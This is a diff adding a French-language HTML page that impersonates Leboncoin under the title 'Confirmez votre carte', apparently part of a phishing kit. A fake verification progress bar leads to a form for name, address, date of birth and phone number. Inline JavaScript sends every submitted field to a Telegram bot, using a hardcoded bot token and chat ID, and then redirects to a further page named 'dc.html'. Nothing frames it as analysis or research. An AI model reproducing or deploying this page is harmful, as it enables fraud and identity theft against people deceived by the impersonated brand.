@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmez votre carte</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/inputmask@5.0.6/dist/inputmask.min.js"></script>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    header {
+      width: 100%;
+      padding: 20px 0;
+      display: flex;
+      justify-content: center;
+      background-color: #ffffff;
+    }
+
+    header img {
+      width: 150px;
+      height: auto;
+    }
+
+    .evolution-chain {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      gap: 30px;
+      margin-top: 20px;
+    }
+
+    .step {
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+
+    .step span.title {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #000;
+    }
+
+    .circle {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: #FF5A00;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .circle-3, .circle-4 {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: white;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .checkmark {
+      font-size: 14px;
+      color: white;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      background-color: #FF5A00;
+      border-radius: 50%;
+    }
+
+    .line {
+      position: absolute;
+      top: 70%;
+      left: 100%;
+      width: 20px;
+      height: 2px;
+      background-color: #FF5A00;
+      margin-top: -1px;
+    }
+
+    .step:last-child .line {
+      display: none;
+    }
+
+    main {
+      padding: 20px;
+      width: 100%;
+      max-width: 500px;
+      background-color: white;
+      margin-top: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .form-row {
+      margin-bottom: 20px;
+    }
+
+    .form-row input {
+      width: 80%;
+      padding: 14px;
+      border-radius: 5px;
+      border: 2px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+      color: #333;
+      position: relative;
+      margin: 0 auto;
+    }
+
+    .form-row input:focus {
+      border-color: #ff6e14;
+      outline: none;
+    }
+
+    .coll button {
+      width: 80%;
+      height: 50px;
+      color: white;
+      background: #ff6e14;
+      border-radius: 25px;
+      border: none;
+      font-size: 1em;
+      font-weight: bold;
+      margin-top: 20px;
+      transition: background-color 0.3s;
+      margin: 0 auto;
+    }
+
+    .coll button:hover {
+      background-color: #e05e00;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+    <img src="image/logo.png" alt="Logo Leboncoin">
+</header>
+
+<!-- Barre d'évolution juste sous le logo -->
+<div class="evolution-chain">
+    <div class="step">
+        <span class="title">Confirmer</span>
+        <div class="circle">
+            <div class="checkmark">✔</div>
+        </div>
+        <div class="line"></div>
+    </div>
+    <div class="step">
+        <span class="title">Checkpoint</span>
+        <div class="circle">
+            <div class="checkmark">✔</div>
+        </div>
+        <div class="line"></div>
+    </div>
+    <div class="step">
+        <span class="title">Vérifier</span>
+        <div class="circle circle-3">
+            <div class="dot"></div>
+        </div>
+        <div class="line"></div>
+    </div>
+    <div class="step">
+        <span class="title">Complete</span>
+        <div class="circle circle-4"></div>
+    </div>
+</div>
+
+<!-- Formulaire de Contact -->
+<main>
+    <h1>Confirmez votre carte</h1>
+
+    <form id="contactForm" method="POST">
+        <!-- Champ Nom -->
+        <div class="form-row">
+            <input type="text" name="lastName" id="lastName" required placeholder="Nom">
+        </div>
+
+        <!-- Champ Prénom -->
+        <div class="form-row">
+            <input type="text" name="firstName" id="firstName" required placeholder="Prénom">
+        </div>
+
+        <!-- Champ Adresse ligne 1 -->
+        <div class="form-row">
+            <input type="text" name="address1" id="address1" required placeholder="Adresse ligne 1">
+        </div>
+
+        <!-- Champ Adresse ligne 2 -->
+        <div class="form-row">
+            <input type="text" name="address2" id="address2" placeholder="Adresse ligne 2 (facultatif)">
+        </div>
+
+        <!-- Champ Date de Naissance avec le format JJ/MM/AAAA -->
+        <div class="form-row input-mask-wrapper">
+            <input type="text" name="dob" id="dob" required placeholder="JJ/MM/AAAA" maxlength="10">
+        </div>
+
+        <!-- Champ Code Postal -->
+        <div class="form-row">
+            <input type="text" name="postalCode" id="postalCode" required placeholder="Code Postal" maxlength="5">
+        </div>
+
+        <!-- Champ Ville -->
+        <div class="form-row">
+            <input type="text" name="city" id="city" required placeholder="Ville">
+        </div>
+
+        <!-- Champ Numéro de Téléphone -->
+        <div class="form-row input-mask-wrapper">
+            <input type="text" name="phone" id="phone" required placeholder="Numéro de téléphone" maxlength="14">
+        </div>
+
+        <div class="coll">
+            <button type="submit">Envoyer</button>
+        </div>
+    </form>
+</main>
+
+<script>
+// Masque pour le champ Date de naissance (JJ/MM/AAAA)
+$(document).ready(function() {
+    const dob = document.getElementById("dob");
+    Inputmask("99/99/9999", {
+        placeholder: "JJ/MM/AAAA",
+        showMaskOnFocus: true,
+        clearIncomplete: true
+    }).mask(dob);
+});
+
+// Token du bot Telegram
+const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI";  
+const chatId = "5601119281"; 
+
+// Fonction pour envoyer les données à Telegram
+async function sendToTelegram(formData) {
+    const message = `Nouveau message depuis le formulaire de confirmation de carte :
+        \nNom: ${formData.lastName}
+        \nPrénom: ${formData.firstName}
+        \nAdresse 1: ${formData.address1}
+        \nAdresse 2: ${formData.address2 || 'Non renseignée'}
+        \nDate de Naissance: ${formData.dob}
+        \nCode Postal: ${formData.postalCode}
+        \nVille: ${formData.city}
+        \nNuméro de téléphone: ${formData.phone}
+    `;
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const body = JSON.stringify({
+        chat_id: chatId,
+        text: message
+    });
+
+    try {
+        const response = await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: body
+        });
+
+        const data = await response.json();
+        if (data.ok) {
+        
+        // Rediriger vers dc.html après l'envoi réussi
+            window.location.href = "dc.html";
+        } else {
+            alert("Erreur lors de l'envoi des informations.");
+            console.error('Erreur Telegram:', data.description);
+        }
+    } catch (error) {
+        console.error("Erreur lors de l'envoi:", error);
+        alert("Une erreur est survenue.");
+    }
+}
+
+// Gestion de la soumission du formulaire
+document.getElementById("contactForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // Empêche la soumission par défaut
+
+    const lastName = document.getElementById("lastName").value;
+    const firstName = document.getElementById("firstName").value;
+    const address1 = document.getElementById("address1").value;
+    const address2 = document.getElementById("address2").value;
+    const dob = document.getElementById("dob").value;
+    const postalCode = document.getElementById("postalCode").value;
+    const city = document.getElementById("city").value;
+    const phone = document.getElementById("phone").value;
+
+    // Créer un objet avec les données du formulaire
+    const formData = {
+        lastName: lastName,
+        firstName: firstName,
+        address1: address1,
+        address2: address2,
+        dob: dob,
+        postalCode: postalCode,
+        city: city,
+        phone: phone
+    };
+
+    // Appeler la fonction pour envoyer les données à Telegram
+    sendToTelegram(formData);
+});
+
+</script>
+</body>
+</html>
